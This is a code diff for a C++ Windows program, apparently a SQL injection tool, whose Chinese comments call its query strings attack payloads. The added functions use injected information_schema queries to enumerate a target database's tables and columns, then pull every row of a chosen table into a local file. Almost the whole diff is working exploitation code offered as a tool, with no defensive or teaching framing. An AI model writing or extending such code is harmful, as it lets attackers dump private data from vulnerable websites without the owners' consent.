@@ -2,6 +2,7 @@
 #include<vector>
 #include <string>
 #include "stdafx.h"
+#include <stdlib.h>
 using namespace std;
 void Injector::SeparatePara()
 {
@@ -519,8 +520,8 @@ bool Injector::GetUser()
 		return false;
 	}
 }
-bool Injector::GetInjectiongValue(string &ResultString,string &InjectString)
-{
+bool Injector::GetInjectionValue(string &ResultString,string &InjectString)
+{/*第一次参数是结果，第二个参数是攻击负荷。传出结果是攻击负荷返回的数据*/
 	int cZero = '0';
 	if (m_InjectionKeyWord.length()==0)
 		return false;
@@ -547,11 +548,15 @@ bool Injector::GetInjectiongValue(string &ResultString,string &InjectString)
 		int BeginOffset;
 		int EndOffset;
 		int DataLength;
-		if ((BeginOffset = content.find(m_InjectionKeyWord, 0)) == -1)
+		if ((BeginOffset = content.find(m_InjectionKeyWord, 0)) == -1){
+			delete h; 
 			return false;
+		}
 		BeginOffset += m_iKeyWordLength;
-		if ((EndOffset = content.find(m_InjectionKeyWordEnd, BeginOffset)) == -1)
+		if ((EndOffset = content.find(m_InjectionKeyWordEnd, BeginOffset)) == -1){
+			delete h; 
 			return false;
+		}
 		DataLength = EndOffset - BeginOffset;
 		m_csql_injectordlg->m_csDBUser.SetWindowText(m_UserName.c_str());
 		ResultString = content.substr(BeginOffset, DataLength);
@@ -597,28 +602,44 @@ bool Injector::GetInjectiongValue(string &ResultString,string &InjectString)
 		return false;
 	}
 }
-bool  Injector::GetDatabaseName()
+bool Injector::GetDatabaseName()
 {
 	string InjectString = "database();";
-	GetInjectiongValue(m_DatabaseName, InjectString);
+	GetInjectionValue(m_DatabaseName, InjectString);
 	if (m_DatabaseName.length()==0)
 		return false;
 	m_csql_injectordlg->m_csDBName.SetWindowText(m_DatabaseName.c_str());
 	return true;
 }
-bool Injector::GetTableName(string &DatabaseName)//获得表明,保存在m_vecTable中,并写入界面
+bool Injector::GetTableName()//获得表明,保存在m_vecTable中,并写入界面
 {
-	string HexDBName;
-	//将DBNAME转为hex版
-	for (string::iterator *i=m_DatabaseName.begin(); i!=m_DatabaseName.end(); ++i)
-	{
-		char hex[3] = {0};
-		int iChar = (char)*i;
-		itoa_s(iChar, hex, 2, 16);
-		HexDBName+=hex;
+	char cZero= '0';
+	string halfAttackString = "table_name from information_schema.tables where table_schema='" + m_DatabaseName +"' limit ";/*缺少limit 1，1*/
+	int iLimit = 1;
+	char limitNum[3]={0};
+	_itoa_s(iLimit,limitNum,3, 10);
+	while (true){
+		_itoa_s(iLimit,limitNum,3, 10);
+		string AttackString = halfAttackString + limitNum;
+		AttackString+=',';
+		AttackString+=limitNum;
+		iLimit++;
+		string TableName;
+		if (GetInjectionValue(TableName, AttackString))
+		{
+			m_vecTable.push_back(TableName);
+		}
+		else
+		{
+			break;
+		}
 	}
-
-	return false;
+	for (vector<string>::iterator i=m_vecTable.begin(); i!=m_vecTable.end(); ++i)
+	{
+		m_csql_injectordlg->m_listboxTable.AddString(i->c_str());
+	}
+	m_csql_injectordlg->m_btnExportTable.EnableWindow(true);
+	return true;
 	
 }
 bool Injector::FirstStepInject()
@@ -627,5 +648,72 @@ bool Injector::FirstStepInject()
 	GetInjectionKeyWord(m_InjectionKeyWord);
 	GetUser();
 	GetDatabaseName();
+	GetTableName();
 	return true;;
+}
+bool Injector::GetColumnName(string TableName)
+{
+	m_vecColumnName.clear();
+	char cZero= '0';
+	string halfAttackString ="column_name from information_schema.columns where table_name='"+TableName+"' limit ";//缺少limit
+	int iLimit = 1;
+	char limitNum[3]={0};
+	
+	while (true){
+		_itoa_s(iLimit,limitNum,3, 10);
+		string AttackString = halfAttackString + limitNum;
+		AttackString+=',';
+		AttackString+=limitNum;
+		iLimit++;
+		string ColumnName;
+		if (GetInjectionValue(ColumnName, AttackString))
+		{
+			m_vecColumnName.push_back(ColumnName);
+		}
+		else
+		{
+			break;
+		}
+	}
+	return true;
+}
+bool Injector::ExportTable(string TableName,string FileName)
+{
+	GetColumnName(TableName);
+	FILE *fp = fopen(FileName.c_str(), "w+");
+	int iLimit = 1;
+	char LimitNum[3] = {0};
+	string Space = " ";
+	string LRLF = "\r\n";
+	while (true){
+		_itoa_s(iLimit, LimitNum, 10);
+		for (vector<string>::iterator i =m_vecColumnName.begin(); i!=m_vecColumnName.end(); ++i){
+			string AttackString =*i;
+			string DataValue;
+			AttackString +=" from ";
+			AttackString +=TableName;
+			AttackString += " limit ";
+			AttackString += LimitNum;
+			AttackString += ",";
+			AttackString += LimitNum;
+			if (GetInjectionValue(DataValue, AttackString))
+			{
+				fwrite(DataValue.c_str(), DataValue.length(), 1, fp);
+				fwrite(Space.c_str(), Space.length(), 1, fp);
+			}
+			else
+			{
+				fwrite(LRLF.c_str(), LRLF.length(), 1, fp);
+				if (i==m_vecColumnName.begin())
+				{
+					goto end;
+				}
+				break;
+			}
+
+		}
+		iLimit++;
+	}
+end:
+	return true;
 }
